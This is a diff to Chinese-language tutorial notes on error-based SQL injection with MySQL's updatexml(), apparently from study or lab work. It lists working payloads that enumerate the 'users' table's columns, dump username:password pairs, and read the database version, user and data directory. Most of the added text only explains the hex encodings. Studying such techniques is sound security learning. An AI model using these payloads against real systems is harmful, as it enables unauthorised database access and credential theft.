@@ -393,11 +393,21 @@ B. 分段全拿
 
 `1' and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name = 0x7573657273),1,31),1),1) and '1' = '1`
 
-(0x7573657273 就是 users，用十六进制免去引号 用'users'效果一样)
+(0x7573657273 就是十六进制表示的 `users`，用`'users'`效果一样)
 
 (5) 拿数据(与(3)一样，都有AB两种方法，类比即可)
 
 `1' and updatexml(1,concat(0x7e,substr((select group_concat(username,0x3a,password) from users),1,31),1),1) and '1' = '1`
+
+`0x3a`为16进制下的`:`
+
+(6) 查看环境信息(突然简单hhh)
+
+版本信息: `1' and updatexml(1,concat(0x7e,version()),1) and '1'='1`
+
+用户名: `1' and updatexml(1,concat(0x7e,user()),1) and '1'='1`
+
+目录: `1' and updatexml(1,concat(0x7e,@@datadir),1) and '1'='1`
 
 ## SQL数据库的补充知识
 一 基础字符部分
